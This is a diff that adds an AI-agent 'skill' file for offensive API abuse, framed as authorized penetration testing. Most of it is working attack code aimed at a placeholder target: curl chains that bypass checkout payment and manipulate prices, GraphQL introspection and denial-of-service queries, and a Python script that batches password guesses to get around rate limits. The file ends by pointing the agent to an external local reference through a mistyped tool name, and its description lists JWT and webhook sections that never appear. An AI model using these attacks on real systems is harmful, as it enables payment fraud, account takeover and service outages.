@@ -1,0 +1,166 @@
+---
+name: offensive-api-abuse
+description: "Advanced API exploitation methodology focused on business logic abuse and sophisticated attack patterns that bypass traditional security controls. Covers business logic bypass through API call chaining and workflow manipulation. Addresses GraphQL-specific attacks including batching for credential brute-force, query depth exploitation, and introspection abuse. Includes pagination exploitation for data exfiltration, webhook hijacking for SSRF and data interception, and resource exhaustion through algorithmic complexity attacks. Covers race conditions in API transactions using parallel request techniques. Provides comprehensive JWT manipulation including algorithm confusion, kid injection, jku/x5u abuse, and claim tampering. Details API key leakage detection across source repositories, client-side code, and error messages. Covers undocumented endpoint discovery through predictable naming, debug routes, and source map analysis. Tooling includes Arjun, ParamSpider, jwt_tool, and GraphQL Voyager. Designed for authorized penetration testers targeting business logic layers that automated scanners miss."
+---
+
+# Offensive API Abuse and Advanced Exploitation
+
+You are conducting authorized security assessments targeting the business logic layer of API-driven applications. Traditional vulnerability scanners miss the attack patterns in this skill because they require understanding of application workflows, state transitions, and trust relationships between API endpoints. Your goal is to identify vulnerabilities that allow financial manipulation, data exfiltration through legitimate channels, privilege escalation via workflow abuse, and service disruption through logic-layer attacks.
+
+## Quick Workflow
+
+1. Map the complete API surface including undocumented endpoints using Arjun, ParamSpider, and manual discovery.
+2. Model the business workflows: identify multi-step transactions, state machines, and trust chains between endpoints.
+3. Test each workflow for race conditions using parallel request techniques.
+4. Extract and analyze JWTs for algorithm confusion, weak signing, and claim injection opportunities.
+5. If GraphQL is present, test batching for brute-force amplification, query depth for DoS, and introspection for schema leakage.
+6. Probe pagination for data enumeration and exfiltration opportunities.
+7. Test webhook configurations for SSRF and callback hijacking.
+8. Search for API key leakage in client code, error responses, and public repositories.
+9. Verify all discovered endpoints for authorization consistency.
+10. Document business impact for each finding with financial or operational consequence estimates.
+
+---
+
+## Business Logic Bypass via API Chaining
+
+Business logic vulnerabilities emerge when individual API endpoints are secure in isolation but the workflow connecting them has exploitable gaps. You identify these by mapping the intended transaction flow and then deviating from it.
+
+```bash
+# E-commerce checkout bypass
+# Normal flow: add_to_cart -> apply_coupon -> calculate_total -> pay -> confirm
+# Attack: skip payment and go directly to confirm
+
+curl -s -X POST -H "Authorization: Bearer $TOKEN" \
+  -H "Content-Type: application/json" \
+  -d '{"product_id": "PROD-001", "quantity": 1}' \
+  "https://target.example.com/api/v1/cart/items" | jq .
+
+curl -s -X POST -H "Authorization: Bearer $TOKEN" \
+  -H "Content-Type: application/json" \
+  -d '{"coupon_code": "SAVE20"}' \
+  "https://target.example.com/api/v1/cart/coupon" | jq .
+
+# Skip payment -- attempt direct order confirmation
+curl -s -X POST -H "Authorization: Bearer $TOKEN" \
+  -H "Content-Type: application/json" \
+  -d '{"cart_id": "CART-12345"}' \
+  "https://target.example.com/api/v1/orders/confirm" | jq .
+```
+
+```bash
+# Price manipulation: add expensive item for free shipping, calculate, remove it
+curl -s -X POST -H "Authorization: Bearer $TOKEN" \
+  -H "Content-Type: application/json" \
+  -d '{"product_id": "EXPENSIVE-001", "quantity": 1}' \
+  "https://target.example.com/api/v1/cart/items"
+
+curl -s -X POST -H "Authorization: Bearer $TOKEN" \
+  "https://target.example.com/api/v1/cart/calculate"
+
+curl -s -X DELETE -H "Authorization: Bearer $TOKEN" \
+  "https://target.example.com/api/v1/cart/items/EXPENSIVE-001"
+
+curl -s -X POST -H "Authorization: Bearer $TOKEN" \
+  -H "Content-Type: application/json" \
+  -d '{"payment_method": "card_on_file"}' \
+  "https://target.example.com/api/v1/cart/pay"
+```
+
+```bash
+# State manipulation, negative quantities, currency confusion
+curl -s -X PATCH -H "Authorization: Bearer $TOKEN" \
+  -H "Content-Type: application/json" \
+  -d '{"status": "pending"}' \
+  "https://target.example.com/api/v1/orders/ORD-5001"
+
+curl -s -X POST -H "Authorization: Bearer $TOKEN" \
+  -H "Content-Type: application/json" \
+  -d '{"product_id": "PROD-001", "quantity": -1}' \
+  "https://target.example.com/api/v1/cart/items"
+
+curl -s -X POST -H "Authorization: Bearer $TOKEN" \
+  -H "Content-Type: application/json" \
+  -d '{"amount": 100, "currency": "IDR"}' \
+  "https://target.example.com/api/v1/payments"
+```
+
+---
+
+## GraphQL Batching and Abuse
+
+GraphQL APIs introduce unique attack surfaces through query batching, introspection, and nested query execution that bypass rate limiting and authorization controls.
+
+```bash
+# Full introspection query -- extract types and mutations
+curl -s -X POST -H "Content-Type: application/json" \
+  -H "Authorization: Bearer $TOKEN" \
+  -d '{"query": "{ __schema { types { name kind fields { name type { name kind ofType { name } } } } } }"}' \
+  "https://target.example.com/graphql" | jq '.data.__schema.types[] | select(.kind == "OBJECT")'
+
+curl -s -X POST -H "Content-Type: application/json" \
+  -H "Authorization: Bearer $TOKEN" \
+  -d '{"query": "{ __schema { mutationType { fields { name args { name type { name kind } } } } } }"}' \
+  "https://target.example.com/graphql" | jq '.data.__schema.mutationType.fields[].name'
+```
+
+Batching for brute-force amplification -- send multiple authentication attempts in a single HTTP request to bypass per-request rate limiting:
+
+```python
+#!/usr/bin/env python3
+"""GraphQL batching for authentication brute-force amplification."""
+import requests, json, sys
+
+TARGET = "https://target.example.com/graphql"
+BATCH_SIZE = 50
+
+def run_batch_brute(email, wordlist_path):
+    with open(wordlist_path) as f:
+        passwords = [line.strip() for line in f if line.strip()]
+
+    for i in range(0, len(passwords), BATCH_SIZE):
+        batch = passwords[i:i + BATCH_SIZE]
+        payload = [
+            {"query": f'mutation a{j} {{ login(email: "{email}", password: "{pwd}") {{ token success }} }}'}
+            for j, pwd in enumerate(batch)
+        ]
+        resp = requests.post(TARGET, json=payload, headers={"Content-Type": "application/json"})
+        if resp.status_code == 429:
+            print(f"[!] Rate limited at batch index {i}")
+            break
+        for j, result in enumerate(resp.json()):
+            if result.get("data", {}).get("login", {}).get("success"):
+                print(f"[+] Valid: {email}:{batch[j]}")
+                return
+        print(f"  Batch {i // BATCH_SIZE + 1}: {len(batch)} attempts in 1 request")
+
+if __name__ == "__main__":
+    run_batch_brute(sys.argv[1], sys.argv[2])
+```
+
+```bash
+# Query depth exploitation for denial of service
+curl -s -X POST -H "Content-Type: application/json" \
+  -H "Authorization: Bearer $TOKEN" \
+  -d '{"query": "{ users { posts { comments { author { posts { comments { author { posts { comments { author { name } } } } } } } } } } }"}' \
+  "https://target.example.com/graphql"
+
+# Field duplication for response amplification
+curl -s -X POST -H "Content-Type: application/json" \
+  -H "Authorization: Bearer $TOKEN" \
+  -d '{"query": "{ a1: users { name email } a2: users { name email } a3: users { name email } a4: users { name email } a5: users { name email } a6: users { name email } a7: users { name email } a8: users { name email } a9: users { name email } a10: users { name email } }"}' \
+  "https://target.example.com/graphql"
+```
+
+---
+
+
+---
+
+## 📚 Deep Reference (Progressive Disclosure)
+
+> ⚠️ **CONTEXT OPTIMIZATION:** The detailed methodology, edge cases, attack vectors, and advanced configurations for this skill are stored externally to save tokens.
+
+To access the full technical reference, you MUST use your iew_file tool to read:
+
+d:\xampp\htdocs\0-fonte\.agent\skills\claude-red-offensive-api-abuse\references\reference.md
